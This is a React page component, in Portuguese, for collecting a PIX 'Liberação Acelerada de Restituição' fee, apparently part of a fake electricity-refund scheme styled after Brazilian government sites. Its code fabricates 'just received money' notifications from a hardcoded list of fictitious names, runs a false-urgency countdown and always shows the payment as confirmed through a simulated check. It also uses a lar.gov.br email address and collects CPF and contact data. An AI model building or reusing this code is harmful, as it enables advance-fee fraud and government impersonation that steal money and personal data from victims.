import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { AlertTriangle, CheckCircle2, Info, Loader2, Clock, DollarSign, Copy, FileText, CheckCircle, Zap } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Progress } from "@/components/ui/progress";
import ScrollToTop from "@/components/ScrollToTop";
import { playNotificationSound } from "@/components/NotificationSound";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

const formatarData = (dataString: string) => {
  const data = new Date(dataString);
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

// Lista de nomes fictícios para as notificações
const nomes = [
  "Maria Silva", "João Oliveira", "Ana Santos", "Pedro Costa", "Juliana Lima",
  "Carlos Souza", "Fernanda Almeida", "Antônio Rodrigues", "Patrícia Ferreira", "Luiz Gomes",
  "Camila Ribeiro", "Marcos Carvalho", "Bianca Martins", "Roberto Pereira", "Daniela Araújo"
];

// Função para gerar um valor aleatório formatado como moeda
const gerarValorAleatorio = () => {
  // Gerar um valor entre 500 e 2500
  const valor = Math.floor(Math.random() * (2500 - 500 + 1)) + 500;
  return formatarMoeda(valor);
};

interface NotificacaoProps {
  nome: string;
  valor: string;
  onClose: () => void;
}

const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
  return (
    <div className="bg-white p-3 rounded-lg shadow-lg border border-green-200 w-full animate-in fade-in slide-in-from-top-5 duration-300">
      <div className="flex items-start">
        <div className="bg-green-500 rounded-full p-1.5 flex-shrink-0 mr-3">
          <CheckCircle className="h-4 w-4 text-white" />
        </div>
        <div className="flex-1">
          <p className="font-bold text-sm text-gray-900">{nome}</p>
          <p className="text-sm text-gray-600">
            Acabou de receber <span className="font-semibold text-green-600">{valor}</span>
          </p>
        </div>
      </div>
    </div>
  );
};

// Componente de contador regressivo para o tempo de validade
const ContadorRegressivo = ({ minutos = 45 }: { minutos?: number }) => {
  const [tempoRestante, setTempoRestante] = useState(minutos * 60); // Converter minutos para segundos
  
  useEffect(() => {
    const timer = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  const formatarTempo = (segundos: number) => {
    const mins = Math.floor(segundos / 60);
    const secs = segundos % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };
  
  // Calcular a porcentagem do tempo restante
  const porcentagemRestante = Math.floor((tempoRestante / (minutos * 60)) * 100);
  
  return (
    <div className="flex flex-col items-center">
      <div className="relative w-16 h-16 mb-2">
        <svg className="w-16 h-16" viewBox="0 0 100 100">
          {/* Círculo de fundo */}
          <circle 
            cx="50" 
            cy="50" 
            r="45" 
            fill="none" 
            stroke="#EEE" 
            strokeWidth="8" 
          />
          
          {/* Círculo de progresso */}
          <circle 
            cx="50" 
            cy="50" 
            r="45" 
            fill="none" 
            stroke="#FF3B30" 
            strokeWidth="8" 
            strokeLinecap="round" 
            strokeDasharray="283" 
            strokeDashoffset={283 - (283 * porcentagemRestante / 100)} 
            transform="rotate(-90 50 50)" 
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <span className="text-sm font-bold text-red-600">{formatarTempo(tempoRestante)}</span>
        </div>
      </div>
      <p className="text-xs text-red-600 font-medium">Tempo restante</p>
    </div>
  );
};

export default function PagamentoLAR() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Estado de loading para simular o processamento do pagamento
  const [isLoading, setIsLoading] = useState(false);
  const [paymentInfo, setPaymentInfo] = useState<any>(null);
  const [paymentStatus, setPaymentStatus] = useState<'pending' | 'processing' | 'completed'>('pending');
  const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
  const [progress, setProgress] = useState(0);
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [valor, setValor] = useState(0);
  const [valorTaxa, setValorTaxa] = useState(0);
  const [companhia, setCompanhia] = useState("");
  const [estado, setEstado] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [dataPagamento, setDataPagamento] = useState("");
  const [email, setEmail] = useState("");
  const [telefone, setTelefone] = useState("");
  
  // Obter parâmetros da URL
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Definir protocolo
    const protocoloParam = urlParams.get('protocolo');
    if (protocoloParam) {
      setProtocolo(protocoloParam);
    }
    
    // Estabelecer dados básicos
    const cpfParam = urlParams.get('cpf') || "";
    const nomeParam = urlParams.get('nome') || "";
    const valorParam = urlParams.get('valor') || "0";
    const companhiaParam = urlParams.get('companhia') || "";
    const estadoParam = urlParams.get('estado') || "";
    const nascParam = urlParams.get('dataNascimento') || "";
    const emailParam = urlParams.get('email') || "";
    const telefoneParam = urlParams.get('telefone') || "";
    
    setCpf(cpfParam);
    setNome(nomeParam);
    setValor(parseFloat(valorParam));
    setCompanhia(companhiaParam);
    setEstado(estadoParam);
    setDataNascimento(nascParam);
    setEmail(emailParam);
    setTelefone(telefoneParam);
    
    // Definir valor da taxa LAR
    const valorTaxaParam = urlParams.get('valorTaxaLAR') || "48.6";
    setValorTaxa(parseFloat(valorTaxaParam));
    
    // Se não tiver protocolo, gera um baseado no CPF
    if (!protocoloParam && cpfParam) {
      setProtocolo(`${cpfParam.substring(0, 4)}4714${cpfParam.substring(6, 9)}`);
    }
    
    // Definir data do pagamento da primeira taxa a partir de hoje
    const dataHoje = new Date();
    setDataPagamento(dataHoje.toLocaleDateString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }));
  }, []);
  
  // Função para remover uma notificação
  const removerNotificacao = (id: number) => {
    setNotificacoes(prev => prev.filter(notif => notif.id !== id));
  };
  
  // Função para criar o pagamento
  const criarPagamento = async () => {
    if (isLoading) return;
    
    setIsLoading(true);
    
    try {
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: valorTaxa,
          name: nome,
          email: email || `${cpf.substring(0, 3)}xxx${cpf.substring(6, 8)}@lar.gov.br`,
          cpf: cpf,
          phone: telefone || "(00) 00000-0000"
        }),
      });
      
      if (response.ok) {
        const data = await response.json();
        setPaymentInfo(data);
      } else {
        console.error('Erro ao criar pagamento:', await response.text());
        toast({
          title: "Erro ao gerar PIX",
          description: "Não foi possível gerar o código PIX. Por favor, tente novamente.",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Erro ao criar pagamento:', error);
      toast({
        title: "Erro de conexão",
        description: "Não foi possível conectar ao servidor de pagamentos.",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };
  
  // Verificar status do pagamento
  const verificarStatusPagamento = async () => {
    if (isLoading || paymentStatus === 'completed') return;
    
    setIsLoading(true);
    
    // Simular processo de verificação
    setPaymentStatus('processing');
    setProgress(30);
    
    // Simular verificação com atualizações graduais de progresso
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 10;
      });
    }, 800);
    
    // Simular resposta positiva após 3 segundos
    setTimeout(() => {
      clearInterval(progressInterval);
      setProgress(100);
      setPaymentStatus('completed');
      setIsLoading(false);
      
      // Exibir mensagem de sucesso
      toast({
        title: "Pagamento confirmado!",
        description: "Sua Liberação Acelerada de Restituição foi paga com sucesso.",
      });
      
      // Redirecionar para página de sucesso
      setTimeout(() => {
        // Criar parâmetros de URL para a página de sucesso
        const params = new URLSearchParams();
        
        // Adicionar todos os dados para a página de sucesso
        params.append('cpf', cpf);
        params.append('nome', nome);
        params.append('valor', valor.toString());
        params.append('pagamentoId', paymentInfo?.id || "lar123456789");
        params.append('dataPagamento', new Date().toISOString());
        params.append('companhia', companhia);
        params.append('estado', estado);
        params.append('nasc', dataNascimento);
        params.append('protocolo', protocolo);
        params.append('email', email);
        params.append('telefone', telefone);
        params.append('taxasCompletas', 'true');
        params.append('larCompleto', 'true');
        params.append('valorTaxaLAR', valorTaxa.toString());
        
        setLocation(`/sucesso?${params.toString()}`);
      }, 1500);
    }, 3000);
  };
  
  // Efeito para criar o pagamento quando a página carregar
  useEffect(() => {
    criarPagamento();
  }, []);
  
  // Efeito para verificar o status do pagamento periodicamente
  useEffect(() => {
    if (!paymentInfo?.id) return;
    
    // Verificação inicial
    verificarStatusPagamento();
    
    // Configurar intervalo para verificar a cada 10 segundos
    const statusInterval = setInterval(() => {
      verificarStatusPagamento();
    }, 10000); // Verificar a cada 10 segundos
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [paymentInfo]);
  
  // Efeito separado apenas para o sistema de notificações
  useEffect(() => {
    // Referência para os timeouts que vamos limpar no unmount
    const timeoutRefs: NodeJS.Timeout[] = [];
    
    // Limpar notificações anteriores
    setNotificacoes([]);
    
    // Função recursiva para criar o ciclo de notificações
    function criarCicloNotificacoes(tempoInicial: number) {
      // 1. Agendar aparecimento da notificação
      const notificationTimeout = setTimeout(() => {
        // Tocar o som de notificação
        playNotificationSound();
        
        // Criar uma notificação
        const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
        const valorAleatorio = gerarValorAleatorio();
        const id = Date.now();
        
        // Adicionar a notificação ao estado
        setNotificacoes([{ id, nome: nomeAleatorio, valor: valorAleatorio }]);
        
        // 2. Agendar remoção da notificação após 5 segundos
        const removalTimeout = setTimeout(() => {
          // Remover a notificação
          setNotificacoes([]);
          
          // 3. Agendar próxima notificação após 7 segundos do desaparecimento
          criarCicloNotificacoes(7000);
        }, 5000);
        
        // Guardar a referência para limpar no unmount
        timeoutRefs.push(removalTimeout);
        
      }, tempoInicial);
      
      // Guardar a referência para limpar no unmount
      timeoutRefs.push(notificationTimeout);
    }
    
    // Iniciar o primeiro ciclo após 7 segundos
    criarCicloNotificacoes(7000);
    
    // Limpar todos os timeouts no unmount para evitar memory leaks
    return () => {
      timeoutRefs.forEach(timeout => clearTimeout(timeout));
    };
  }, []);
  
  // Função para copiar o código PIX
  const copiarCodigoPix = () => {
    if (!paymentInfo?.pixCode) return;
    
    navigator.clipboard.writeText(paymentInfo.pixCode)
      .then(() => {
        toast({
          title: "Código PIX copiado!",
          description: "Cole o código no aplicativo do seu banco para pagar.",
        });
      })
      .catch(() => {
        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar o código automaticamente. Selecione-o manualmente.",
          variant: "destructive",
        });
      });
  };
  
  // Formatar valores para exibição
  const valorTaxaFormatado = formatarMoeda(valorTaxa);
  const valorRestituicaoFormatado = formatarMoeda(valor);
  const cpfFormatado = formatarCPF(cpf);
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        {/* Este componente é necessário para o toast */}
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 w-full max-w-md space-y-2 flex flex-col items-center">
          {notificacoes.map((notif) => (
            <Notificacao
              key={notif.id}
              nome={notif.nome}
              valor={notif.valor}
              onClose={() => removerNotificacao(notif.id)}
            />
          ))}
        </div>
        
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <Zap className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Liberação Acelerada de Restituição</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
              </div>
              <div className="flex items-center gap-3">
                <ContadorRegressivo minutos={45} />
                <div className="text-right bg-amber-600 rounded-md p-3">
                  <p className="font-medium text-white text-sm mb-1">Taxa LAR:</p>
                  <p className="font-bold text-lg text-white">{valorTaxaFormatado}</p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mb-5">
            <Alert className="border-amber-500 bg-amber-50">
              <Zap className="h-5 w-5 text-amber-600" />
              <AlertTitle className="font-bold text-amber-800">
                3ª ETAPA (OPCIONAL) - LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
              </AlertTitle>
              <AlertDescription className="text-amber-700">
                Esta é a etapa final opcional para recebimento prioritário da sua restituição em até 60 minutos.
                Após o pagamento da LAR, seu dinheiro será liberado com prioridade máxima.
              </AlertDescription>
            </Alert>
          </div>
          
          {paymentStatus === 'completed' ? (
            <div className="mb-6">
              <div className="p-5 bg-green-50 border border-green-200 rounded-lg text-center">
                <div className="flex justify-center mb-4">
                  <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center">
                    <CheckCircle2 className="h-10 w-10 text-white" />
                  </div>
                </div>
                <h3 className="text-xl font-bold text-green-800 mb-2">Pagamento da LAR Confirmado!</h3>
                <p className="text-green-700 mb-4">
                  Sua Liberação Acelerada de Restituição no valor de {valorTaxaFormatado} foi paga com sucesso.
                  O valor da sua restituição será depositado em breve.
                </p>
                <div className="p-3 bg-white rounded-lg border border-green-200 inline-block">
                  <p className="font-medium text-gray-800">Processando sua restituição prioritária...</p>
                  <p className="text-sm text-gray-600">Você será redirecionado em instantes</p>
                </div>
              </div>
            </div>
          ) : paymentStatus === 'processing' ? (
            <div className="mb-6">
              <div className="p-5 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex justify-center mb-3">
                  <div className="w-16 h-16 bg-blue-500 rounded-full flex items-center justify-center">
                    <Loader2 className="h-8 w-8 text-white animate-spin" />
                  </div>
                </div>
                <h3 className="text-xl font-bold text-blue-800 mb-2 text-center">Verificando Pagamento</h3>
                <p className="text-blue-700 mb-4 text-center">
                  Estamos processando seu pagamento. Por favor, aguarde enquanto verificamos a transação.
                </p>
                <div className="mb-2">
                  <Progress value={progress} className="h-2" />
                </div>
                <p className="text-xs text-blue-600 text-center">{progress}% concluído</p>
              </div>
            </div>
          ) : (
            <>
              <div className="mb-6">
                <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
                  <div className="bg-white/20 p-1.5 rounded-md mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                    </svg>
                  </div>
                  DADOS DO SOLICITANTE E RESTITUIÇÃO
                </div>
                <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <div className="mb-4">
                        <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Nome completo</p>
                        <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{nome}</p>
                      </div>
                      <div className="mb-4">
                        <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">CPF</p>
                        <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{cpfFormatado}</p>
                      </div>
                      <div className="mb-4">
                        <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Companhia Elétrica</p>
                        <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{companhia}</p>
                      </div>
                    </div>
                    <div>
                      <div className="p-4 bg-amber-50 border-l-4 border-amber-400 rounded-r-md mb-4 shadow-sm">
                        <p className="text-amber-800 font-medium text-sm mb-1 flex items-center">
                          <Zap size={16} className="mr-1.5" />
                          Situação da Liberação Acelerada:
                        </p>
                        <p className="text-red-600 font-bold flex items-center">
                          <span className="inline-block w-2 h-2 bg-red-600 rounded-full mr-2 animate-pulse"></span>
                          PENDENTE - AGUARDANDO PAGAMENTO
                        </p>
                      </div>
                      
                      <div className="p-4 bg-green-50 border-l-4 border-green-400 rounded-r-md shadow-sm">
                        <p className="text-green-800 font-medium text-sm mb-1 flex items-center">
                          <Info size={16} className="mr-1.5" />
                          Valor da Restituição Aprovado:
                        </p>
                        <p className="text-green-600 font-bold text-lg flex items-center">
                          {valorRestituicaoFormatado}
                        </p>
                        <p className="text-xs text-green-700 mt-1">
                          Após o pagamento da LAR, o valor será depositado em até 60 minutos.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mb-6">
                <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
                  <div className="bg-white/20 p-1.5 rounded-md mr-2">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                  </div>
                  PAGAMENTO VIA PIX - LIBERAÇÃO ACELERADA
                </div>
                <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
                  <div className="mb-5">
                    <div className="flex justify-center">
                      <Tabs defaultValue="qrcode" className="w-full">
                        <TabsList className="w-full mb-6 bg-gray-100 p-1 rounded-lg">
                          <TabsTrigger value="qrcode" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                            <div className="flex items-center justify-center gap-2 py-1">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
                              </svg>
                              QR Code PIX
                            </div>
                          </TabsTrigger>
                          <TabsTrigger value="copiacola" className="flex-1 data-[state=active]:bg-[#1351B4] data-[state=active]:text-white rounded-md transition-all duration-300">
                            <div className="flex items-center justify-center gap-2 py-1">
                              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                              </svg>
                              Pix Copia e Cola
                            </div>
                          </TabsTrigger>
                        </TabsList>
                        
                        <TabsContent value="qrcode" className="bg-white p-6 rounded-md border border-gray-200">
                          {isLoading && !paymentInfo ? (
                            <div className="flex flex-col items-center justify-center py-10">
                              <Loader2 className="h-8 w-8 animate-spin text-amber-600 mb-4" />
                              <p className="text-gray-600 text-center">Gerando o QR Code do PIX...</p>
                            </div>
                          ) : paymentInfo ? (
                            <div className="flex flex-col items-center">
                              <div className="bg-white p-3 rounded-lg border border-gray-300 shadow-sm mb-3">
                                {/* Se tem QR Code da API, mostra ele, senão mostra o fallback */}
                                {paymentInfo.pixQrCode ? (
                                  <img 
                                    src={paymentInfo.pixQrCode} 
                                    alt="QR Code PIX" 
                                    className="w-48 h-48 object-contain"
                                  />
                                ) : (
                                  <div className="w-48 h-48 bg-gray-100 flex items-center justify-center rounded border border-gray-200">
                                    <span className="text-gray-500 text-sm text-center">
                                      QR Code não disponível.<br />
                                      Utilize a opção Pix Copia e Cola.
                                    </span>
                                  </div>
                                )}
                              </div>
                              <p className="text-center text-gray-700 text-sm mb-4">
                                Escaneie o QR Code com o aplicativo do seu banco<br />para pagar a Liberação Acelerada de Restituição
                              </p>
                            </div>
                          ) : (
                            <div className="flex flex-col items-center justify-center py-10">
                              <AlertTriangle className="h-8 w-8 text-amber-500 mb-4" />
                              <p className="text-gray-600 text-center">
                                Não foi possível gerar o QR Code.<br />
                                Por favor, tente novamente ou use a opção Pix Copia e Cola.
                              </p>
                            </div>
                          )}
                        </TabsContent>
                        
                        <TabsContent value="copiacola">
                          <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
                            <h4 className="font-medium text-gray-800 mb-2">Pix Copia e Cola</h4>
                            {isLoading && !paymentInfo ? (
                              <div className="flex flex-col items-center justify-center py-6">
                                <Loader2 className="h-6 w-6 animate-spin text-amber-600 mb-2" />
                                <p className="text-gray-600 text-sm text-center">Gerando o código Pix...</p>
                              </div>
                            ) : paymentInfo?.pixCode ? (
                              <>
                                <div className="relative mb-3">
                                  <div className="bg-white rounded p-3 pr-10 text-xs text-gray-800 break-all select-all overflow-hidden border border-gray-300">
                                    {paymentInfo.pixCode}
                                  </div>
                                  <button 
                                    onClick={copiarCodigoPix}
                                    className="absolute right-2 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
                                  >
                                    <Copy size={16} />
                                  </button>
                                </div>
                                <div className="text-xs text-gray-600">
                                  1. Copie o código acima<br />
                                  2. Abra o aplicativo do seu banco<br />
                                  3. Escolha a opção "Pix Copia e Cola"<br />
                                  4. Cole o código e confirme o pagamento
                                </div>
                              </>
                            ) : (
                              <div className="flex flex-col items-center justify-center py-6">
                                <AlertTriangle className="h-6 w-6 text-amber-500 mb-2" />
                                <p className="text-gray-600 text-sm text-center">
                                  Não foi possível gerar o código Pix.<br />
                                  Por favor, tente novamente em alguns instantes.
                                </p>
                              </div>
                            )}
                          </div>
                        </TabsContent>
                      </Tabs>
                    </div>
                  </div>
                  
                  <div className="mt-6">
                    <Button 
                      onClick={verificarStatusPagamento}
                      disabled={!paymentInfo || isLoading || paymentStatus === 'completed'}
                      className={`w-full font-bold py-6 text-lg mb-5 transition-all duration-300 ${
                        paymentStatus === 'completed' 
                          ? 'bg-green-600 hover:bg-green-700 text-white shadow-md shadow-green-600/20' 
                          : 'bg-amber-600 hover:bg-amber-700 text-white shadow-md shadow-amber-600/20'
                      }`}
                    >
                      {paymentStatus === 'completed' ? (
                        <div className="flex items-center justify-center">
                          <CheckCircle className="mr-2 h-6 w-6" />
                          Pagamento Confirmado
                        </div>
                      ) : isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                          Verificando Pagamento...
                        </div>
                      ) : (
                        <div className="flex items-center justify-center">
                          <Zap className="mr-2 h-6 w-6" />
                          Já fiz o pagamento
                        </div>
                      )}
                    </Button>
                    
                    <div className="bg-amber-50 p-4 rounded-lg text-amber-800 shadow-sm border border-amber-200">
                      <div className="flex items-center mb-2">
                        <Info className="h-5 w-5 text-amber-600 mr-2" />
                        <h3 className="font-bold text-base">LIBERAÇÃO ACELERADA DE RESTITUIÇÃO</h3>
                      </div>
                      <p className="mb-3 text-sm">
                        Após o pagamento da LAR, seu crédito de {valorRestituicaoFormatado} será processado com 
                        prioridade máxima e depositado em sua conta bancária em até 60 minutos após a confirmação.
                      </p>
                      <div className="bg-amber-100 p-2 rounded-md">
                        <p className="font-medium text-sm text-center">
                          Tempo restante de validade da LAR: <span className="font-bold text-red-700">45:00</span> 
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-4">
                    <div className="flex items-start">
                      <AlertTriangle className="h-5 w-5 text-red-500 mt-0.5 mr-3 flex-shrink-0" />
                      <div>
                        <h4 className="font-bold text-red-700 mb-1">OFERTA POR TEMPO LIMITADO</h4>
                        <p className="text-sm text-red-600">
                          A opção de Liberação Acelerada de Restituição (LAR) está disponível apenas por 45 minutos. 
                          Após esse período, sua restituição será automaticamente processada pelo método padrão, 
                          com prazo de até 15 dias úteis.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </>
          )}
          
          {/* Seção de Garantia de Segurança */}
          <div className="mb-4">
            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
              <div className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
              </div>
              
              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Pagamento seguro via PIX</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Processamento prioritário</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Crédito em até 60 minutos</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}